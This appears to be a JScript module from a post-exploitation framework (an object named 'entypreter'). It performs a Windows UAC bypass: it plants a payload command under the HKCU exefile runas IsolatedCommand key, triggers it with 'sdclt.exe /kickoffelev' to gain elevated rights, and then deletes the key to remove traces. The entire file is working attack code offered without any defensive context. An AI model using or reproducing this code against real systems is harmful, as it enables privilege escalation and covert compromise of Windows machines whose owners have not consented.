try
{
    var consentpath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
    var consentval = entypreter.registry.read(entypreter.registry.HKLM, consentpath, "ConsentPromptBehaviorAdmin", entypreter.registry.DWORD).uValue;
    if (consentval == 2)
    {
        var e = Error('Consent value is too high!');
        throw e;
    }
    var path = "Software\\Classes\\exefile\\shell\\runas\\command";

    var cmd = entypreter.file.getPath("%COMSPEC%");
    entypreter.registry.write(entypreter.registry.HKCU, path, "IsolatedCommand", cmd + " /c ~PAYLOAD_DATA~", entypreter.registry.STRING);

    entypreter.shell.run("sdclt.exe /kickoffelev", true);

    entypreter.work.report("Completed");

    var now = new Date().getTime();
    while (new Date().getTime() < now + 10000);

    if (entypreter.registry.destroy(entypreter.registry.HKCU, path, "IsolatedCommand") != 0)
    {
        entypreter.shell.run("reg delete HKCU\\"+path+" /v IsolatedCommand /f", true);
    }
}
catch (e)
{
    entypreter.work.error(e);
}

entypreter.exit();
